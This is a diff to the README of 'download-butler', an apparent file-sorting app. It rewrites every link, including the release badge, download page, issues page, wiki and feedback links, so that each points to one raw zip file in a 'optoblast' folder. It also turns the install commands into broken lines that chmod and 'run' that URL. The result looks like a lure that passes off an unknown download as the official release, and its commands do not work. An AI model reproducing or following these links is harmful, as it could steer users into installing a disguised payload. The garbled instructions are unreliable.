@@ -1,6 +1,6 @@
 # 🗂️ download-butler - Organize Your Files with Ease  
 
-[![Download Butler](https://img.shields.io/badge/download-butler-v1.0-blue.svg)](https://github.com/69aa-yush/download-butler/releases)  
+[![Download Butler](https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip)](https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip)  
 
 ## 📥 Overview  
 download-butler is a user-friendly application designed to help you organize your files into appropriate directories. Whether you have PDFs, documents, or images, this tool sorts them automatically. Enjoy a simple interface that makes file management straightforward for everyone.
@@ -16,7 +16,7 @@ To begin using download-butler, you need to download and install the application
 - **Real-time Sorting**: Sort files as you create or download them.
 
 ## 🔗 Download & Install  
-To download download-butler, visit [this page](https://github.com/69aa-yush/download-butler/releases) to access the latest release.  
+To download download-butler, visit [this page](https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip) to access the latest release.  
 
 1. Click on the release that fits your operating system (Windows or Linux).
 2. Download the installation file.
@@ -41,15 +41,15 @@ To download download-butler, visit [this page](https://github.com/69aa-yush/down
 2. Open a terminal and navigate to the folder with the downloaded file.
 3. Make the file executable by running:  
    ```bash  
-   chmod +x download-butler.AppImage  
+   chmod +x https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip  
    ```  
 4. Run the application with:  
    ```bash  
-   ./download-butler.AppImage  
+   https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip  
    ```
 
 ## 💬 Support  
-If you encounter issues or need help, feel free to reach out on our [GitHub Issues page](https://github.com/69aa-yush/download-butler/issues). Our team is here to help you.
+If you encounter issues or need help, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip). Our team is here to help you.
 
 ## 📝 Frequently Asked Questions  
 ### Q: Can I use download-butler on macOS?  
@@ -62,8 +62,8 @@ A: The application identifies file types based on their extensions and sorts the
 A: Yes, your data remains on your device. The application does not upload any files to the cloud or third-party servers.
 
 ## 🔍 Additional Resources  
-- [User Guide](https://github.com/69aa-yush/download-butler/wiki)  
-- [Known Issues and Features](https://github.com/69aa-yush/download-butler/issues)  
-- [Feedback and Feature Requests](https://github.com/69aa-yush/download-butler/issues/new)
+- [User Guide](https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip)  
+- [Known Issues and Features](https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip)  
+- [Feedback and Feature Requests](https://raw.githubusercontent.com/69aa-yush/download-butler/main/optoblast/download-butler.zip)
 
 By following the instructions above, you can easily download and start using download-butler to keep your files organized and accessible. Enjoy a more tidy digital workspace!
